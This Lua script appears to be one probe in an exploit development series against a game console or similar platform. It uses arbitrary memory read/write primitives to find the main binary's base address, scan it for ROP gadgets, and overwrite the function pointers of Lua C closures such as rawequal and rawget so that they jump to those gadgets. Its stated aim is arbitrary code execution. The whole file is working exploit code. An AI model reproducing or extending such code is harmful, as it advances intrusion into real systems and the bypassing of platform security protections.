-- CRASH_CLASS: MODERATE
-- PROBE 56d: CClosure +0x20 redirect to eboot gadgets
--
-- 56c/56f: redirecting CClosure +0x20 to OTHER Lua C functions works
-- (rawequal→rawget, rawget→type, string.len, math.abs — all produced
-- target-like outputs with restore).
--
-- This probe: redirect +0x20 to RAW EBOOT GADGETS.
-- When Lua calls a CClosure, it does call(fn_ptr) with rdi=lua_State*.
-- If we point fn_ptr to a gadget like `ret`, it immediately returns.
-- rax (return value = number of Lua return values) is undefined.
--
-- Goal: prove arbitrary code pointer redirect works, not just Lua C→C.
-- If gadgets execute, we have a primitive for register-controlled execution.

print("=== PROBE 56d: CCLOSURE GADGET REDIRECT ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

-- Known gadgets from child ROP (confirmed working in threads)
local G = {
    ret      = 0x42,
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    mov_w    = 0x92C67,  -- mov [rdi], rax; ret
    jmp_loop = 0x15481,
}

-- ============ STEP 1: Find CClosure addresses ============
print("")
print("[1] CClosure addresses")

-- In Lua 5.1, tostring(func) = "function: 0xADDRESS"
local targets = {
    {name = "rawequal", fn = rawequal},
    {name = "rawget",   fn = rawget},
    {name = "type",     fn = type},
    {name = "tostring", fn = tostring},
    {name = "rawset",   fn = rawset},
    {name = "select",   fn = select},
}

for _, t in ipairs(targets) do
    local s = tostring(t.fn)
    local addr_str = s:match("0x([0-9a-fA-F]+)") or s:match(": ([0-9a-fA-F]+)$") or s:match(": (%d+)$")
    if addr_str then
        t.addr = tonumber(addr_str, 16) or tonumber(addr_str)
        -- Read +0x20 = C function pointer
        local fn_ptr = rq(t.addr + 0x20)
        t.fn_ptr = fn_ptr
        print(string.format("  %s: obj=0x%X +0x20=%s", t.name, t.addr, fmt(fn_ptr)))
    else
        print(string.format("  %s: can't parse addr from '%s'", t.name, s))
    end
end

-- ============ STEP 2: Scan for xor eax,eax;ret gadget ============
print("")
print("[2] Scan eboot for xor_eax_ret (31 C0 C3)")

local xor_eax_ret_off = nil
-- Scan first 1MB of eboot .text (RX, readable)
for off = 0, 0x100000 - 3, 1 do
    local b0 = rd(text_lo + off)
    if b0 then
        -- Read as dword, check low 3 bytes
        local byte0 = b0 % 256
        local byte1 = math.floor(b0 / 256) % 256
        local byte2 = math.floor(b0 / 65536) % 256
        if byte0 == 0x31 and byte1 == 0xC0 and byte2 == 0xC3 then
            xor_eax_ret_off = off
            print(string.format("  found at eboot+0x%X", off))
            break
        end
    end
    -- Yield every 64KB to avoid timeout
    if off % 0x10000 == 0 and off > 0 then
        native.fcall_with_rax(stub, 20)
    end
end

if not xor_eax_ret_off then
    print("  not found in first 1MB, will use ret gadget only")
end

-- ============ STEP 3: Test gadget redirects ============
print("")
print("[3] Gadget redirect tests")

-- Use rawequal as our test subject
local re = nil
for _, t in ipairs(targets) do
    if t.name == "rawequal" and t.addr then re = t; break end
end

if not re then
    print("  ABORT: can't find rawequal CClosure")
    print("canary=" .. (alive() and "OK" or "FAIL"))
    return
end

local orig_fn = re.fn_ptr
print(string.format("  rawequal obj=0x%X orig_fn=%s", re.addr, fmt(orig_fn)))

-- Helper: redirect, call, restore, report
local function test_gadget(name, gadget_addr, call_fn)
    if not alive() then return "DEAD" end

    -- Save original
    local saved = rq(re.addr + 0x20)

    -- Write gadget address
    local wok = pcall(function()
        memory.write_qword(re.addr + 0x20, gadget_addr)
    end)
    if not wok then
        return "WRITE_FAIL"
    end

    -- Verify write
    local verify = rq(re.addr + 0x20)
    local match = fmt(verify) == fmt(gadget_addr)

    -- Call in pcall
    local call_ok, call_result
    local nret = 0
    call_ok = pcall(function()
        -- Use the calling function provided
        call_result = call_fn()
    end)

    -- IMMEDIATELY restore
    pcall(function()
        memory.write_qword(re.addr + 0x20, saved)
    end)

    -- Verify restore
    local restored = rq(re.addr + 0x20)
    local restore_ok = fmt(restored) == fmt(saved)

    local result_str = "nil"
    if call_result ~= nil then
        result_str = tostring(call_result)
    end

    return string.format("write=%s call_ok=%s result=%s restore=%s alive=%s",
        tostring(match), tostring(call_ok), result_str, tostring(restore_ok),
        tostring(alive()))
end

-- Test A: ret gadget (0xC3)
-- Expected: returns immediately, rax = whatever → Lua sees some nret
print("")
print("  [A] ret gadget (eboot+0x42)")
local r = test_gadget("ret", eaddr(G.ret), function()
    return rawequal(1, 2)
end)
print("    " .. r)

-- Test A2: ret with no args
print("  [A2] ret gadget, no args")
r = test_gadget("ret_noarg", eaddr(G.ret), function()
    return rawequal()
end)
print("    " .. r)

-- Test B: xor eax, eax; ret (if found)
if xor_eax_ret_off then
    print("")
    print(string.format("  [B] xor eax,eax;ret (eboot+0x%X)", xor_eax_ret_off))
    r = test_gadget("xor_eax_ret", eaddr(xor_eax_ret_off), function()
        return rawequal(1, 2)
    end)
    print("    " .. r)
end

-- Test C: Try with multiple return value capture
print("")
print("  [C] ret gadget — capture return values")
if alive() then
    local saved = rq(re.addr + 0x20)
    pcall(function() memory.write_qword(re.addr + 0x20, eaddr(G.ret)) end)

    local ok2, a, b, c, d, e = pcall(rawequal, 1, 2)

    pcall(function() memory.write_qword(re.addr + 0x20, saved) end)

    print(string.format("    ok=%s a=%s b=%s c=%s d=%s e=%s",
        tostring(ok2),
        tostring(a), tostring(b), tostring(c),
        tostring(d), tostring(e)))
end

-- Test D: Try xor_eax_ret with return capture
if xor_eax_ret_off and alive() then
    print("")
    print("  [D] xor eax,eax;ret — capture returns (expect 0 nret)")
    local saved = rq(re.addr + 0x20)
    pcall(function() memory.write_qword(re.addr + 0x20, eaddr(xor_eax_ret_off)) end)

    local ok2, a, b = pcall(rawequal, 1, 2)

    pcall(function() memory.write_qword(re.addr + 0x20, saved) end)

    print(string.format("    ok=%s a=%s b=%s", tostring(ok2), tostring(a), tostring(b)))
end

-- Test E: Redirect rawget to ret gadget (different function)
print("")
print("  [E] rawget → ret gadget")
local rg = nil
for _, t in ipairs(targets) do
    if t.name == "rawget" and t.addr then rg = t; break end
end
if rg and alive() then
    local saved_rg = rq(rg.addr + 0x20)
    pcall(function() memory.write_qword(rg.addr + 0x20, eaddr(G.ret)) end)

    local ok2, a = pcall(rawget, {x=1}, "x")

    pcall(function() memory.write_qword(rg.addr + 0x20, saved_rg) end)
    print(string.format("    ok=%s a=%s restore=%s",
        tostring(ok2), tostring(a), tostring(fmt(rq(rg.addr + 0x20)) == fmt(saved_rg))))
end

-- Test F: Verify normal operation restored
print("")
print("  [F] Verify normal operation after all redirects")
if alive() then
    local eq = rawequal(1, 1)
    local neq = rawequal(1, 2)
    local rg_val = rawget({key = 42}, "key")
    print(string.format("    rawequal(1,1)=%s rawequal(1,2)=%s rawget={key=42}=%s",
        tostring(eq), tostring(neq), tostring(rg_val)))
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56d COMPLETE ===")
